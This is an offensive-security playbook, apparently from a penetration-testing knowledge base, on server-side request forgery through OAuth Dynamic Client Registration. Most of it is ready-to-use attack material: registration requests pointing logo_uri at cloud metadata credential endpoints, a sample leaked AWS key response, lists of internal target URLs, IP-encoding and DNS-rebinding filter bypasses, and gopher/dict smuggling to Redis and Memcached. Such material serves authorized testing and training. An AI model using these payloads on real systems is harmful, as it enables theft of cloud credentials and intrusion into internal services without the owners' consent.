# OAuth — SSRF via Dynamic Client Registration

## When this applies

- OAuth provider supports OpenID Connect Dynamic Client Registration (`POST /reg`, `/register`).
- The provider FETCHES URLs supplied during registration (`logo_uri`, `jwks_uri`, `sector_identifier_uri`, `policy_uri`, `tos_uri`).
- No allowlist / network-isolation on the URLs the provider fetches.

## Technique

Register a client with a `logo_uri` (or similar) pointing to internal services (cloud metadata, internal admin panels, localhost-only services). The provider fetches the URL from its own network position, exposing internal resources via the response.

## Steps

### 1. Discover the registration endpoint

```http
GET /.well-known/openid-configuration HTTP/1.1
```

Look for `registration_endpoint` in the JSON response.

### 2. Register with cloud metadata URL

**AWS:**
```http
POST /reg HTTP/1.1
Host: oauth-server.com
Content-Type: application/json

{
  "redirect_uris": ["https://example.com"],
  "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```

Response contains `client_id`. Then trigger the fetch:

```http
GET /client/RETURNED_CLIENT_ID/logo HTTP/1.1
```

Response contains the AWS credentials:
```json
{
  "Code": "Success",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "SECRET_KEY",
  "Token": "TOKEN_VALUE"
}
```

### 3. Common SSRF target paths

**AWS metadata:**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document
```

**Azure:**
```
http://metadata.azure.com/metadata/instance?api-version=2021-02-01
http://metadata.azure.com/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/
```

**Google Cloud:**
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

**Internal network:**
```
http://localhost:8080/admin
http://127.0.0.1:6379/                # Redis
http://192.168.1.1/config
http://10.0.0.1:9200/                  # Elasticsearch
```

### 4. URLs to abuse on registration

Common URL parameters that get fetched server-side:

| Parameter | Behavior |
|---|---|
| `logo_uri` | Fetched to display logo |
| `jwks_uri` | Fetched to get public keys (also relevant for JWT alg-confusion) |
| `sector_identifier_uri` | Fetched to validate redirect_uri sector |
| `policy_uri` | Sometimes fetched for content discovery |
| `tos_uri` | Sometimes fetched for content discovery |
| `request_uri` | At authorization time, fetched to retrieve request object |

### 5. Bypass URL filtering

**Alternative IP representations (for `169.254.169.254`):**
```
http://169.254.169.254/                  # Decimal
http://0xA9FEA9FE/                       # Hex
http://2852039166/                       # Integer
http://[::ffff:169.254.169.254]/         # IPv6
http://169.254.169.254.xip.io/           # DNS reflector
http://[fd00::169:254:169:254]/          # IPv6 private
http://169.254.0169.254/                 # Octal
http://0251.0376.0251.0376/              # Octal
```

**DNS rebinding:**
```
1. Register domain: evil.com with short TTL (1 second)
2. Initially resolves to: 1.2.3.4 (allowed)
3. After validation, rebind to: 169.254.169.254
```

**Protocol smuggling:**
```
gopher://internal-server:6379/_SET%20key%20value
dict://internal-server:11211/STATS
ldap://internal-server:389/
sftp://internal-server:22/
```

(`gopher://` to Redis is a common pivot — see `injection/scenarios/nosql/redis-ssrf-gopher.md`.)

**Redirects:**
```
logo_uri=https://allowed.com/redirect → 169.254.169.254
```

### 6. Observe the SSRF response

The provider may surface the fetched content in:
- The actual logo display (HTTP 200 returns the response body).
- Error messages mentioning the target.
- Timing differences (open vs filtered ports → different response times).

### 7. Confirm with Burp Collaborator

Always start with a Collaborator URL to confirm the SSRF works:

```json
{"logo_uri": "https://abc123.burpcollaborator.net/test.png"}
```

Trigger the fetch:
```http
GET /client/CLIENT_ID/logo HTTP/1.1
```

Check Collaborator for an HTTP request from the OAuth server.

## Verifying success

- Burp Collaborator records a hit from the OAuth server's outbound IP.
- Cloud metadata returns credentials, identity tokens, or instance details.
- Internal HTTP service returns content (banner, page) that confirms internal reach.

## Common pitfalls

- Most modern providers explicitly block private IP ranges (`169.254.0.0/16`, `10.0.0.0/8`, `127.0.0.0/8`, etc.).
- Some providers fetch through a SOCKS proxy that filters internal IPs — bypass via DNS rebinding or alternative representations.
- IMDSv2 (AWS) requires a session token — read-only metadata reads only work against IMDSv1 endpoints.
- The fetched content may be processed (e.g. expected to be an image) and rejected if it doesn't match — but error messages often leak the response.
- Some providers cache fetched URLs aggressively — change URL per test to force re-fetch.

## Tools

- Burp Suite Collaborator (essential for confirmation).
- ssrfmap / SSRF-Sheriff for SSRF scanning.
- DNS rebinding services (rbndr.us, lock.cmpxchg8b.com).
- Custom HTTP server logs to confirm outbound requests.
